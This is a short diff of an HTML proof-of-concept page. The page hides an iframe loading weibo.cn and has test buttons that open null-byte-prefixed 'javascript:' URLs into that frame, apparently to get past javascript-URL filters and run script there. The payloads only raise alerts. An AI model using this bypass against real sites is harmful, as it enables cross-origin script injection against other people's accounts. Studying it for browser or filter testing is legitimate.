@@ -53,7 +53,10 @@ function geturl(){
 </head>
 <body>
 <iframe name="t1" src="http://weibo.cn" style="display:none" security="restricted" sandbox=""></iframe>
-<input type=button value="测试" class="button" 
+<input type=button value="测试1" class="button" 
 onclick=window.open('\x00javascript:var%20a%3D%24%28%27form%27%29.action%3Balert%28u%29%3B','t1')>
+
+<input type=button value="测试2" class="button" 
+onclick=window.open('\x00javascript:alert(%27nope%27)','t1')>
 </body>
 </html>
